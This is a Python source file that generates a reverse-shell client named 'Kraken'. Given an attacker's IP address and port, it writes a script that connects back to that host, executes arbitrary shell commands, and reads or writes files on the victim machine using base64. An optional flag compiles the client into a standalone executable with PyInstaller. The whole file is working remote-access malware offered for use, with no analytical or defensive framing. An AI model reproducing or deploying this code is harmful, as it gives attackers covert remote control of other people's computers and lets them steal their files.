from colorama import Fore 
import os, sys
def Generate(ip, port):

    print(Fore.GREEN + "Generating Output File on with #IP: %s : #PORT: %s" % (sys.argv[1], sys.argv[2]))
    print(Fore.RED + "INSTALLING REQUIREMENTS!\n\n")
    print(Fore.WHITE)

    script = """
try:
    import json
    import socket 
    import subprocess
    import os
    import base64

except ImportError:
    exit()

class Target:
    def __init__(self, ip, port):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((ip, port))

    def execute(self,command):
        try:
            return subprocess.check_output(command, shell=True)
        except:
            return "No command: " + (command)

    def sterelize_send(self, data):
        json_data = json.dumps(data)
        self.client.send(json_data)
    
    def sterelize_recv(self):
        json_data = str()
        while True:
            try:
                json_data = json_data + self.client.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue

    def change_dir(self, to):
        os.chdir(to)
        return os.getcwd()

    def read_file(self, to):
        with open(to, "rb") as f:
            return base64.b64encode(f.read())

    def write_file(self, to, data):
        with open(to, "wb") as f:
            f.write(base64.b64decode(data))
            return "[+]Kraken Done Uploading File!"

    def run(self):
        run = True
        while(run):
            my_cmnd = self.sterelize_recv()
            try:
                if my_cmnd[0] == "exit":
                    self.client.close()
                    exit()
                elif my_cmnd[0] == "cd" and len(my_cmnd) > 1:
                    cmnd_res = self.change_dir(my_cmnd[1])
                
                elif my_cmnd[0] == "kraken-get":
                    cmnd_res = self.read_file(my_cmnd[1])

                elif my_cmnd[0] == "kraken-push":
                    cmnd_res = self.write_file(my_cmnd[1], my_cmnd[2])    

                elif my_cmnd[0] == "kraken-help":
                    cmnd_res = ""
                else:
                    cmnd_res = self.execute(my_cmnd)
            except Exception:
                cmnd_res = "[-]Error in command!"

            self.sterelize_send(cmnd_res)

target = Target("%s", %s)
target.run()
    """ % (ip, port)

    with open("target.py", "w") as f:
        f.write(script)
        f.close()

if len(sys.argv) == 3:
    Generate(sys.argv[1], sys.argv[2])
    print(Fore.GREEN + "[+]Generated Target File!")

if len(sys.argv) > 3:
    if(sys.argv[3] == '--compile'):
        os.system("clear")
        os.system("pip3 install pyinstaller")   
        os.system("pyinstaller target.py --onefile")
        print(Fore.GREEN + "[+]Generated Target File and Compiled!")    
        exit()